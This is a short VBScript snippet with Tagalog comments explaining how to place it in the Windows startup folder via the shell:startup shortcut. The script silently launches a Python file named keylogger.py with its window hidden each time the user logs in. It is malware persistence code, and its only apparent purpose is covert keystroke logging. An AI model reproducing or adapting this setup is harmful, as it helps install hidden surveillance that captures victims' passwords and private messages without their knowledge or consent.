` Ilagay mo ito sa startup
` Paano gawin? una pindutin mo WIN + R tapos type shell:starup tapos enter tsaka magbubukas na yun directory ng startup st dun mo ito ilagay

Set objShell = CreateObject("WScript.Shell")
objShell.Run "cmd.exe /c python3 ""C:\Directory\ng\file\nung\python\keylogger.py""", 0, False
